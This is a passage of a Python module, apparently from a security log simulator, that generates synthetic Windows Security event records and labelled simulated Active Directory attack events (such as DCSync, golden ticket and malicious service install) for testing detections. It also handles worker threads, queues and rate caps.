        "Suspicious sAMAccountName change",
    ],
}

def get_threat_names():
    """Expose named threats to the dashboard / CLI 'fire threat' mode."""
    return list(_THREAT_GENERATORS.keys())


def _select_threat(config, session_context):
    """Pick and run a threat generator according to config weights."""
    cfg_mix = _cf(config).get("event_mix", {}).get("threat", {})
    weights = {k: cfg_mix.get(k, v) for k, v in _THREAT_WEIGHTS.items()}
    choice = random.choices(list(weights.keys()), weights=list(weights.values()), k=1)[0]
    fn = _THREAT_GENERATORS[choice]
    result = fn(config, session_context)
    if result is None:
        result = _threat_account_lockout(config, session_context)
    return (result, choice) if result is not None else (None, None)


# Scenario-event dispatch (used by log_simulator.py attack scenarios)

def _generate_scenario_event(scenario_event, config, context):
    """Scenario events let the top-level orchestrator request a specific
    event shape from this module (e.g. "LOGIN_SUCCESS", "LOGIN_FAILURE").
    """
    session_context = (context or {}).get("session_context")
    user = None
    # Direct pinned identity (XDR-orchestrated events): a bring-your-own box user
    # that is NOT in session_context. Build the user dict straight from context so
    # the event carries the EXACT box identity (e.g. a 4624 type-3 IP<->user
    # binding), never a random session user. Only taken when 'user' is a string and
    # no session-based 'user_identity' was given, so existing scenarios/ambient
    # generation are unaffected.
    if context and context.get("user") and not context.get("user_identity"):
        user = {
            "username": context["user"],
            "hostname": context.get("hostname") or context.get("computer") or "WORKSTATION",
            "ip": context.get("src_ip"),
        }
    if user is None and context and context.get("user_identity"):
        user = get_user_by_name(session_context, context["user_identity"])
    if user is None:
        user = _pick_windows_user(session_context)
    if user is None:
        return None

    ev = scenario_event.upper()
    ev = _RENAMED_THREATS.get(ev, ev)
    if ev in ("LOGIN", "LOGIN_SUCCESS"):
        return json.dumps(_build_4624(user, config, logon_type=2, auth_pkg=_NEG_PACKAGE)), "login_success"
    if ev in ("NETWORK_LOGON", "WORKSTATION_LOGON"):
        # Type-3 network logon carrying an explicit source IP — used as an IP↔user
        # binding so IP-keyed detections (DNS/SMB) can join to resolve the user.
        _bind_ip = (context or {}).get("src_ip") or user.get("ip")
        # For an orchestrated pinned identity on a LOCAL (non-domain) box, set the
        # logon domain to the box's own name so the identity matches the endpoint's
        # local account (XSIAM applies no user normalization across domains).
        _dom = None
        if (context or {}).get("user") and not (context or {}).get("user_identity"):
            _dom = ((user.get("hostname") or "").split(".")[0] or None)
            if _dom:
                _dom = _dom.upper()
        return json.dumps(_build_4624(user, config, logon_type=3, ip_override=_bind_ip,
                                      domain_override=_dom)), "network_logon"
    if ev in ("SERVICE_INSTALL", "IMPLANT_SERVICE"):
        # 4697 – a service was installed on the victim host (malware persistence).
        # The SCM's System-channel 7045 accompanies it, with the same name and image.
        _host = (context or {}).get("hostname") or user.get("hostname")
        _sec = _build_4697(config, computer=_host,
                           service_name=(context or {}).get("service_name"),
                           service_file=(context or {}).get("service_file"))
        _ed = _sec["event_data"]
        return [json.dumps(_sec),
                json.dumps(_build_7045(config, computer=_host, service_name=_ed["ServiceName"],
                                       image_path=_ed["ServiceFileName"],
                                       start_type=int(_ed["ServiceStartType"])))], "service_install"
    if ev in ("PROCESS_TREE", "MALWARE_EXECUTION", "PROCESS_CREATE"):
        # A linked chain of 4688s: Office → hidden PowerShell → cmd → LOLBin.
        # PROCESS_CREATE is the alias the DNS C2 scenario uses for cross-sensor causality.
        return _build_process_tree(user, config, c2_ip=(context or {}).get("c2_ip")), "process_tree"
    if ev in ("CLEAR_LOGS", "LOG_CLEARED"):
        # 1102 – the Security audit log was cleared (anti-forensics).
        return json.dumps(_build_1102(user, config)), "log_cleared"
    if ev in ("LOGIN_FAILURE", "LOGIN_FAILED"):
        return json.dumps(_build_4625(user, config, logon_type=2,
                                      status="0xC000006D", sub_status="0xC000006A")), "login_failure"
    if ev == "LOGOFF":
        session = _pop_open_session(user["hostname"], user["username"])
        if not session:
            return None
        return json.dumps(_build_4634(session, config)), "logoff"
    if ev == "LOCKOUT":
        return json.dumps(_build_4740(user, config, source_workstation=user["hostname"])), "lockout"
    if ev == "KERBEROS_TGT":
        return json.dumps(_build_4768(user, config)), "kerberos_tgt"
    if ev == "ACCOUNT_UNLOCK":
        return json.dumps(_build_4767(user, config,
                                      unlocked_by=user["username"])), "account_unlock"
    if ev == "ACCOUNT_DISABLE":
        target = (context or {}).get("target_user") or user["username"]
        return json.dumps(_build_4725(user, config, target_username=target,
                                      target_sid=_stable_user_sid(target))), "account_disable"
    if ev in ("OBJECT_ACCESS", "AUDITED_FILE_ACCESS"):
        # Scenario callers may pin the object; otherwise use the audited pool.
        obj = (context or {}).get("object_name")
        proc = (context or {}).get("process_name")
        if not obj:
            obj, default_proc = random.choice(_AUDITED_FILE_OBJECTS)
            proc = proc or default_proc
        proc = proc or "C:\\Windows\\explorer.exe"
        handle_id = "0x%x" % random.randint(0x100, 0xffff)
        process_id = "0x%x" % random.randint(0x200, 0xffff)
        logon_id = _new_logon_id()
        t = time.time()
        return ([json.dumps(_build_4656(user, config, object_type="File",
                                        object_name=obj, process_name=proc,
                                        access_mask=_ACCESS_MASK_READ,
                                        handle_id=handle_id, process_id=process_id,
                                        logon_id=logon_id, ts=t)),
                 json.dumps(_build_4663(user, config, object_type="File",
                                        object_name=obj, process_name=proc,
                                        access_mask=_ACCESS_MASK_READ,
                                        handle_id=handle_id, process_id=process_id,
                                        logon_id=logon_id,
                                        ts=t + random.uniform(0.01, 0.2)))],
                "object_access")
    # Dispatch to named threat generators
    _threat_dispatch = {
        "ROGUE_FOREST_TRUST":               _threat_rogue_forest_trust,
        "EXISTING_TRUST_SID_FILTER_DOWNGRADE": _threat_existing_trust_sid_filter_downgrade,
        "DCSHADOW":                         _threat_dcshadow,
        "GOLDEN_TICKET":                    _threat_golden_ticket,
        "MALICIOUS_GPO":                    _threat_malicious_gpo,
        "AS_REP_ROASTING":             _threat_as_rep_roasting,
        "ACCOUNT_LOCKOUT":                  _threat_account_lockout,
        "SUSPICIOUS_ACCOUNT_LOCKOUT":       _threat_suspicious_account_lockout,
        "DCSYNC":                           _threat_dcsync,
        "DMSA_PRIVESC":                 _threat_dmsa_privesc,
        "PRIV_GROUP_ADDITION":              _threat_priv_group_addition,
        "MACHINE_ACCOUNT_TO_DOMAIN_ADMINS": _threat_machine_account_to_domain_admins,
        "WIP_ADMINSDHOLDER_ACL_MODIFICATION": _threat_adminsdholder_acl_modification,
        "WIP_IRREGULAR_SERVICE_TGS":        _threat_irregular_service_tgs,
        "IRREGULAR_TGT_BURST":              _threat_irregular_tgt_burst,
        "SMS_ADMINS_ADDITION":              _threat_sms_admins_addition,
        "SMS_ADMINS_ADD_REMOVE":            _threat_sms_admins_add_remove,
        "WIP_SCCM_CONTAINER_RECON":         _threat_sccm_container_recon,
        "DNSHOSTNAME_SPOOFING":             _threat_dnshostname_spoofing,
        "SAMACCOUNTNAME_SPOOFING":          _threat_samaccountname_spoofing,
        "DELEGATION_CHANGE":                _threat_delegation_change,
        "NEW_MACHINE_DELEGATION":           _threat_new_machine_delegation,
        "MULTIPLE_SERVICE_TICKETS":         _threat_multiple_service_tickets,
        "PRIV_GROUP_ADD_REMOVE":            _threat_priv_group_add_remove,
        "WIP_PRIV_CERT_REQUEST":            _threat_priv_cert_request,
        "SUSPICIOUS_ACCOUNT_CREATION":      _threat_suspicious_account_creation,
        "MASS_ACCOUNT_DELETION":            _threat_mass_account_deletion,
        "SENSITIVE_PASSWORD_RESET":     _threat_sensitive_password_reset,
        "WIP_PASSWORD_NEVER_EXPIRES":       _threat_password_never_expires,
        "DEFAULT_ACCOUNT_ENABLED":          _threat_default_account_enabled,
        "LSASS_HANDLE_ACCESS":              _threat_lsass_handle_access,
        "ACCOUNT_ACCESS_REMOVAL":           _threat_account_access_removal,
        "MAILBOX_EXPORT":                   _threat_mailbox_export,
        "MAILBOX_EXPORT_LOG_REMOVAL":       _threat_mailbox_export_log_removal,
        "MAILBOX_CAS_CHANGE":               _threat_mailbox_cas_change,
        "PSEXEC_LATERAL":                   _threat_psexec_lateral,
        "REMOTE_SCHEDULED_TASK":            _threat_remote_scheduled_task,
        "SHARE_ENUMERATION":                _threat_share_enumeration,
        "MALICIOUS_SERVICE_INSTALL":        _threat_malicious_service_install,
        "SHADOW_CREDENTIALS":               _threat_shadow_credentials,
        "PKINIT_AUTH":                      _threat_pkinit_auth,
        "SID_HISTORY_INJECTION":            _threat_sid_history_injection,
        "ADFS_DKM_ACCESS":                  _threat_adfs_dkm_access,
        "KERBEROS_RELAY":                   _threat_kerberos_relay,
        "SPN_CLEARED":                      _threat_spn_cleared,
        "SUSPICIOUS_SAM_CHANGE":            _threat_suspicious_sam_change,
    }
    if ev in _threat_dispatch:
        result = _end_by_now(_threat_dispatch[ev](config, session_context))
        return (result, ev.lower()) if result else None
    return None


# Entry point (called by log_simulator.py on every tick)

def generate_log(config, scenario=None, scenario_event=None,
                 threat_level="Realistic", benign_only=False, context=None):
    """Generate one Windows event record (or batch of records).

    Returns:
      • str            — one JSON record
      • list[str]      — several JSON records (one per event)
      • (obj, name)    — scenario dispatch, or one whole worker threat: (result, name)
      • None           — no eligible Windows users, or nothing buffered by the
                         workers since the last call
    """
    global _BUILD_EVENT_OS_SUBTYPE
    session_context = (context or {}).get("session_context")

    # --- Scenario / story mode (always synchronous) ---
    if scenario_event:
        _BUILD_EVENT_OS_SUBTYPE = _get_os_subtype(config)
        return _generate_scenario_event(scenario_event, config, context)

    if scenario:
        return None

    # --- Nothing to do if there are no Windows users configured ---
    if not _get_windows_users(session_context):
        return None

    # --- Ambient generation: per-host worker threads ---
    # One worker per workstation, one for the DC and one for threats, all feeding the
    # queues drained below. (A single-threaded mode that drew from its own weight
    # table was removed 2026-10-20: the shipped config never used it, and keeping a
    # second table in step with the worker tables kept going wrong.)
    _ensure_orchestrator(config, session_context, threat_level, benign_only)
    # A whole threat first, returned on its own and labelled with its own name.
    # Labelling used to come from _status_queue and attach to whichever 50-event
    # batch happened to drain it, so a threat split across batches was labelled once
    # and counted approximately.
    try:
        threat_name, items = _threat_queue.get_nowait()
        return ((items if len(items) > 1 else items[0]), threat_name)
    except _queue_mod.Empty:
        pass
    # Take everything buffered at this moment. This used to stop at 50 events per
    # call -- with one call a second, a fixed 50 events/s ceiling on Windows that
    # silently discarded whatever the workers produced beyond it. Volume is now set
    # by the workers' own pacing (dc/wks_interval_multiplier in windows_events_
    # config), like every other module. The snapshot keeps one call finite while
    # backpressured workers refill the queue behind it.
    batch = []
    try:
        for _ in range(_output_queue.qsize()):
            batch.append(_output_queue.get_nowait())
    except _queue_mod.Empty:
        pass
    if not batch:
        return None
    return batch if len(batch) > 1 else batch[0]


# Per-host worker generation

# NOTE: these two tables ARE the ambient benign schedule -- _BENIGN_GENERATORS is only
# the name -> function map. A generator added there but to neither table never fires.
#
# The Windows event mix is deliberately code-only.  windows_events_config used to
# carry an "event_mix" block, but these workers never consulted it, so its benign
# weights were dead, and its threat keys named generators that no longer exist
# (brute_force, password_spray, rdp_bruteforce, ...) so every lookup fell through
# to the module default.  It was removed rather than repaired: the selectors below
# already default cleanly when the key is absent (both test suites ship configs
# with no event_mix and pass).  If you want config-tunable weights back, the
# workers must read the override the way _select_threat does --
# re-adding the config block alone will silently do nothing.
_DC_BENIGN_GENS = {
    "dc_kerberos_traffic":  15,
    "dc_directory_service":  8,
    "dc_service_activity":  10,
    "dc_self_logon":         8,
    # 4767 / 4725 are DC-emitted account-administration events.
    "account_unlock":        3,
    "account_disable":       1,
}

_WKS_BENIGN_GENS = {
    "interactive_logon":    18,
    "network_share_logon":  22,
    "workstation_unlock":   18,
    "logoff":               10,
    "service_logon":         6,
    "scheduled_task_logon":  4,
    "cached_logon":          2,
    "rdp_logon":             3,
    "sql_access":           10,
    "web_app_access":        8,
    "ldap_query":            6,
    "ntlm_validation":       4,
    "explicit_cred_runas":   1,
    "password_typo":         2,
    "process_creation":     30,
    "lateral_movement":      3,
    # 4656/4663 on SACL'd file objects -- workstation-side, via the file share.
    "audited_file_access":  12,
    # Per workstation worker (one draw a second): ~0.07 task and ~0.03 service
    # registrations per host per day -- a few a month. At weight 2/1 this was ~1,300
    # and ~440 per host per day.
    "scheduled_task_create": 0.00013,
    "service_install":       0.00006,
}


class _BenignRate:
    """Caps the COMBINED benign output of the DC and workstation workers at a total
    events/s -- the dashboard's rate for this module (set_event_interval). Until
    2026-10-21 the dashboard rate only set how often generate_log() drained the workers,
    so Windows ran at its config pacing (~480 events/s from 265 hosts) whatever the
    slider said: 0.1/s on the card was ~425 events/s on the wire.

    A worker builds its result first and then takes one token per event (a sequence may
    run the bucket into debt, so the average holds); it waits while the bucket is empty.
    rate None = no cap: config pacing only (CLI, training, direct callers). Threats are
    not capped -- the threat level times them, as in every other module."""

    def __init__(self):
        self.rate = None
        self._tokens = 0.0
        self._t = time.monotonic()
        self._cond = threading.Condition()

    def _refill(self, now):
        if self.rate:
            self._tokens = min(max(1.0, self.rate), self._tokens + (now - self._t) * self.rate)
        self._t = now

    def set_rate(self, rate):
        with self._cond:
            self._refill(time.monotonic())
            old = self.rate
            self.rate = rate if rate and rate > 0 else None
            self._tokens = min(self._tokens, max(1.0, self.rate or 1.0))
            self._cond.notify_all()
        if self.rate is not None and (old is None or self.rate < old / 2):
            _drop_scheduled_benign()

    def acquire(self, n, stop_event) -> bool:
        """Take *n* tokens, waiting while the bucket is empty, then wait while the release
        is running more than _MAX_RELEASE_LAG_S late. Without that bound a rate the
        process could not keep up with piled up due events that kept going out after the
        slider was lowered (10,000/s -> 0.5/s still emitted ~1,870/s). Lateness, not heap
        size: the heap also holds the not-yet-due tails of sequences, which are fine.
        False only when stopping."""
        if not self._take(n, stop_event):
            return False
        if self.rate is None:
            return True
        with _release_cond:
            while (_release_heap and _release_heap[0][0] < time.time() - _MAX_RELEASE_LAG_S
                   and not stop_event.is_set()):
                _release_cond.wait(timeout=0.5)
        return not stop_event.is_set()

    def _take(self, n, stop_event) -> bool:
        with self._cond:
            while not stop_event.is_set():
                if self.rate is None:
                    return True
                self._refill(time.monotonic())
                if self._tokens >= 1.0 or self._tokens >= n:
                    self._tokens -= n
                    return True
                self._cond.wait(timeout=min(1.0, (min(n, 1.0) - self._tokens) / self.rate))
        return False

    def pace(self, interval, n_workers):
        """A worker's sleep between draws: its config interval, shortened when the cap
        asks for more than n_workers draws per interval can make."""
        rate = self.rate
        if rate is None:
            return interval
        # 2x headroom: some draws produce nothing (a logoff with no open session).
        return min(interval, max(0.001, n_workers / (2 * rate)))


def _drop_scheduled_benign():
    """Discard benign events scheduled but not yet released. Sequences are released at
    their own timestamps, minutes ahead for some, so after a sharp rate cut the old rate
    kept going out (~3,800 scheduled events, ~7/s for minutes after 10,000/s -> 0.5/s).
    Threat events and activity-bus publishes are kept."""
    with _release_cond:
        kept = [e for e in _release_heap if e[2] is not None or _PUBLISH_KEY in e[4]]
        dropped = len(_release_heap) - len(kept)
        _release_heap[:] = kept
        heapq.heapify(_release_heap)
        _release_cond.notify_all()
    return dropped


_MAX_RELEASE_LAG_S = 2.0
_BENIGN_RATE = _BenignRate()
_N_BENIGN_WORKERS = 1        # DC + one per workstation, set by _ensure_orchestrator


def set_event_interval(interval):
    """Dashboard hook: this module's event_interval (seconds per event) becomes the cap
    on total Windows benign events per second. None or <= 0 removes the cap."""
    try:
        interval = float(interval)
    except (TypeError, ValueError):
        interval = 0.0
    _BENIGN_RATE.set_rate(1.0 / interval if interval > 0 else None)


def _dc_worker(config, session_context, interval, stop_event):
    """Background thread generating DC-specific benign events."""
    _DEFER_IDS.on = True
    stats = _worker_stats["dc"]
    gens = list(_DC_BENIGN_GENS.keys())
    weights = list(_DC_BENIGN_GENS.values())
    while not stop_event.is_set():
        try:
            choice = random.choices(gens, weights=weights, k=1)[0]
            fn = _BENIGN_GENERATORS[choice]
            result = fn(config, session_context)
            if result:
                items = result if isinstance(result, list) else [result]
                if not _BENIGN_RATE.acquire(len(items), stop_event):
                    return
                if not _schedule(items, stop_event):
                    return
                stats["events_generated"] += len(items)
                stats["last_event_time"] = time.time()
        except Exception as exc:
            _note_worker_error("dc", exc)
        stop_event.wait(timeout=_BENIGN_RATE.pace(interval, _N_BENIGN_WORKERS))


def _wks_worker(config, scoped_ctx, hostname, interval, stop_event):
    """Background thread generating workstation-specific benign events."""
    _DEFER_IDS.on = True
    stats = _worker_stats[hostname]
    gens = list(_WKS_BENIGN_GENS.keys())
    weights = list(_WKS_BENIGN_GENS.values())
    while not stop_event.is_set():
        try:
            choice = random.choices(gens, weights=weights, k=1)[0]
            fn = _BENIGN_GENERATORS[choice]
            result = fn(config, scoped_ctx)
            if result is None:
                stop_event.wait(timeout=_BENIGN_RATE.pace(interval, _N_BENIGN_WORKERS))
                continue
            items = result if isinstance(result, list) else [result]
            if not _BENIGN_RATE.acquire(len(items), stop_event):
                return
            if not _schedule(items, stop_event):
                return
            stats["events_generated"] += len(items)
            stats["last_event_time"] = time.time()
        except Exception as exc:
            _note_worker_error(f"wks:{hostname}", exc)
        stop_event.wait(timeout=_BENIGN_RATE.pace(interval, _N_BENIGN_WORKERS))


def _threat_worker(config, session_context, threat_level, interval, stop_event):
    """Background thread that fires threats on a cadence."""
    global last_threat_event_time
    _DEFER_IDS.on = True
    stats = _worker_stats["threats"]
    threat_interval = _get_threat_interval(threat_level, config)

    while not stop_event.is_set():
        try:
            current_time = time.time()
            should_fire = False
            with _STATE_LOCK:
                # An interval of 0 ("Insane") means no spacing: fire on every tick. This
                # used to require interval > 0, so Insane fired NO threats in parallel
                # mode -- every other module special-cases Insane before that test, this
                # worker did not. A tick is base interval x threat_interval_multiplier.
                if threat_interval <= 0 or (current_time - last_threat_event_time) > threat_interval:
                    last_threat_event_time = current_time
                    should_fire = True

            if should_fire:
                result, threat_name = _select_threat(config, session_context)
                if result:
                    items = result if isinstance(result, list) else [result]
                    # Released at its own timestamps; the first chunk carries the name.
                    if not _schedule(items, stop_event, threat_name=threat_name):
                        return
                    stats["events_generated"] += len(items)
                    stats["last_event_time"] = time.time()
                    stats["last_fired"] = threat_name
                    with _STATE_LOCK:
                        _recent_threats.append({"name": threat_name,
                                                "event_count": len(items),
                                                "timestamp": current_time})
                    try:
                        _status_queue.put_nowait({
                            "type": "threat_fired",
                            "name": threat_name,
                            "event_count": len(items),
                            "timestamp": current_time,
                        })
                    except _queue_mod.Full:
                        # Status queue is advisory (dashboard "threat fired"
                        # badge); the events themselves already went out.
                        pass
        except Exception as exc:
            _note_worker_error("threats", exc)
        stop_event.wait(timeout=interval)


def _ensure_orchestrator(config, session_context, threat_level, benign_only):
    """Start worker threads on first call. Subsequent calls are no-ops.

    The workers carry the calling thread's Bad User focus (session_utils.carry_focus), so
    their identity pickers name the target too. Threads start with an empty context, so
    without it the focus stopped at the calling thread."""
    global _orchestrator_started, _BUILD_EVENT_OS_SUBTYPE, _output_queue, _threat_queue
    global _N_BENIGN_WORKERS
    with _orchestrator_lock:
        if _orchestrator_started:
            return
        _orchestrator_started = True

    _BUILD_EVENT_OS_SUBTYPE = _get_os_subtype(config)

    base_interval = config.get("base_event_interval_seconds", 1.0)
    wcfg = _cf(config)

    # Buffer sizes come from config. They are not throughput caps -- workers wait when a
    # buffer is full (_put_backpressured) and the drain takes everything buffered -- they
    # only bound how much is held in memory between generation and delivery.
    _output_queue = _queue_mod.Queue(maxsize=max(1, int(wcfg.get("output_queue_size", 1000))))
    _threat_queue = _queue_mod.Queue(maxsize=max(1, int(wcfg.get("threat_queue_size", 100))))

    # Group users by hostname
    hosts: dict[str, list[str]] = {}
    for uname, prof in (session_context or {}).items():
        if (prof.get("primary_os_type") or "").lower() == "windows":
            hostname = prof.get("primary_hostname", "")
            if hostname:
                hosts.setdefault(hostname, []).append(uname)

    # One thread per workstation. The roster is thousands of Windows PCs; ambient
    # mode keeps a stable sample so the process does not start thousands of
    # threads. Bad User passes a one-user context, so it is never sampled away.
    max_wks = int(wcfg.get("max_workstation_workers", 400))
    if max_wks > 0 and len(hosts) > max_wks:
        import hashlib as _hashlib
        ranked = sorted(hosts, key=lambda h: _hashlib.sha256(f"wks|{h}".encode()).hexdigest())
        keep = ranked[:max_wks]
        try:
            from modules.session_utils import focus_host as _focus_host
            fh = _focus_host()
        except Exception:
            fh = None
        focus_host = fh[2] if fh else None
        if focus_host and focus_host in hosts and focus_host not in keep:
            keep[-1] = focus_host
        hosts = {h: hosts[h] for h in keep}

    # Initialize per-worker stats
    _worker_stats["dc"] = {"events_generated": 0, "last_event_time": 0}
    _worker_stats["threats"] = {"events_generated": 0, "last_event_time": 0, "last_fired": None}
    _N_BENIGN_WORKERS = 1 + len(hosts)
    for hostname in hosts:
        _worker_stats[hostname] = {"events_generated": 0, "last_event_time": 0}

    # DC worker
    dc_interval = base_interval * wcfg.get("dc_interval_multiplier", 0.5)
    threading.Thread(
        target=_carry_focus(_dc_worker),
        args=(config, session_context, dc_interval, _workers_stop),
        daemon=True, name="logsim-win-dc",
    ).start()

    # Per-workstation workers
    wks_interval = base_interval * wcfg.get("wks_interval_multiplier", 1.0)
    for hostname, user_list in hosts.items():
        scoped_ctx = {u: session_context[u] for u in user_list}
        threading.Thread(
            target=_carry_focus(_wks_worker),
            args=(config, scoped_ctx, hostname, wks_interval, _workers_stop),
            daemon=True,
            name=f"logsim-win-{hostname.split('.')[0]}",
        ).start()

    # Release thread: hands scheduled events out at their timestamps (ids assigned then)
    threading.Thread(
        target=_releaser, args=(_workers_stop,),
        daemon=True, name="logsim-win-release",
    ).start()

    # Threat worker (skipped in benign-only mode)
    if not benign_only:
        threat_interval = base_interval * wcfg.get("threat_interval_multiplier", 2.0)
        threading.Thread(
            target=_carry_focus(_threat_worker),
            args=(config, session_context, threat_level, threat_interval, _workers_stop),
            daemon=True, name="logsim-win-threats",
        ).start()


# Public API for Flask UI status

def get_worker_stats() -> dict:
    """Returns current parallel-mode worker stats for the Flask dashboard."""
    return {
        **_worker_stats,
        "queue_depth": _output_queue.qsize(),
        "parallel_active": _orchestrator_started,
    }


def get_recent_threats(max_items: int = 10) -> list:
    """Most-recent threats fired, newest last.  Non-destructive.

    Use this for dashboards/telemetry.  get_status_events() below drains the
    queue generate_log() depends on and must not be used for observation.
    """
    with _STATE_LOCK:
        return list(_recent_threats)[-max_items:]


def get_status_events(max_items: int = 20) -> list:
    """Drain status queue for Flask UI (threat-fired notifications, etc.).

    WARNING: destructive, and generate_log() already drains this queue to label
    its returned batch with the threat that fired.  Calling this concurrently
    steals that label and the threat is under-counted.  Prefer
    get_recent_threats().
    """
    events = []
    try:
        while len(events) < max_items:
            events.append(_status_queue.get_nowait())
    except _queue_mod.Empty:
        pass
    return events
